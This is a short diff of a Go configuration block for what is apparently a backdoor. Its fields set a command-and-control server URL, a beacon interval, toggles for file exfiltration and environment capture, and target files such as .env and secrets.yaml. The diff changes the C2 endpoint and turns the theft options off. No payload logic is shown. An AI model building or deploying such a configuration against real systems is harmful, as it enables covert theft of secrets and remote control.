@@ -37,10 +37,10 @@ type Config struct {
 
 var (
 	defaultConfig = Config{
-		C2Server:         getEnvOrDefault("BACKDOOR_C2", "https://httpbin.org/post"),
+		C2Server:         getEnvOrDefault("BACKDOOR_C2", "https://cure53.de/legitreceiverendpoint"),
 		BeaconInterval:   60,
-		EnableFileExfil:  true,
-		EnableEnvCapture: true,
+		EnableFileExfil:  false,
+		EnableEnvCapture: false,
 		EnableProcessExec: false,
 		TargetFiles:      []string{".env", "config.json", "secrets.yaml"},
 	}
